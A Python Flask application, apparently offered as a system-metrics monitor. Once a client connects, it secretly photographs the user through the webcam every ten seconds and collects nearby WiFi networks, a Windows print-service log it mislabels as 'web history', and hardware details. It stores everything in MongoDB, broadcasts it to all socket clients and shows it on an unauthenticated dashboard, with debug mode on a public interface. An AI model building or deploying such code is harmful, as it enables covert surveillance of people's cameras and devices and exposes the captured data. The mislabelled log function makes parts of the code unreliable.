from flask import Flask, render_template, request
from flask_socketio import SocketIO
import threading
import time
import platform
import psutil
import cv2
import base64
import uuid
import subprocess
from pymongo import MongoClient
from bson import ObjectId
app = Flask(__name__)
socketio = SocketIO(app)
mongo_client = MongoClient('localhost', 27017)
db = mongo_client['system']
collection = db['metrics']
active_connections = {}
def convert_bytes(byte_size):
    gb_size = byte_size / (1024 ** 3)
    if gb_size > 1:
        return f"{gb_size:.2f} GB"
    else:
        mb_size = byte_size / (1024 ** 2)
        return f"{mb_size:.2f} MB"
def get_wifi_info():
    try:
        result = subprocess.run(["netsh", "wlan", "show", "network"], capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        print(f"Failed to get WiFi info: {e}")
        return None
def get_web_history():
    try:
        result = subprocess.run(["powershell", "Get-WinEvent", "-LogName", "Microsoft-Windows-PrintService/Operational", "|", "Select-Object", "Message"], capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        print(f"Failed to get web history: {e}")
        return None
def get_system_metrics():
    metrics = {
        "platform": platform.system(),
        "processor": platform.processor(),
        "mac_address": ':'.join(['{:02x}'.format((int)(mac, 16)) for mac in hex(uuid.getnode())[2:].split(':')]),
        "ip_address": "Not Available",
        "cpu_usage": psutil.cpu_percent(interval=1),
        "memory_usage": psutil.virtual_memory().percent,
        "storage_capacity": convert_bytes(psutil.disk_usage('/').total),
        "storage_usage": convert_bytes(psutil.disk_usage('/').used),
        "wifi_info": get_wifi_info(),
        "web_history": get_web_history(),
    }
    return metrics
def capture_camera_photo():
    capture = cv2.VideoCapture(0)
    ret, frame = capture.read()
    capture.release()
    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 10])
    image_data = base64.b64encode(buffer).decode('utf-8')
    return image_data
def handle_connection(user_id):
    while True:
        system_metrics = get_system_metrics()
        system_metrics["camera_photo"] = capture_camera_photo()
        collection.insert_one({
            "user_id": user_id,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
            **system_metrics
        })
        socketio.emit('data', {'user_id': user_id, **system_metrics})
        time.sleep(10)
@app.route('/')
def index():
    return render_template('index.html')
@app.route('/connect', methods=['GET', 'POST'])
def connect():
    if request.method == 'POST':
        user_id = generate_unique_id()
        active_connections[user_id] = True
        threading.Thread(target=handle_connection, args=(user_id,)).start()
        return "Connection initiated"
    else:
        return render_template('index.html')
@app.route('/dashboard')
def dashboard():
    metrics_data = list(collection.find())
    for data in metrics_data:
        data['_id'] = str(data['_id'])
    return render_template('dashboard.html', metrics_data=metrics_data)
def generate_unique_id():
    return str(uuid.uuid4())
if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
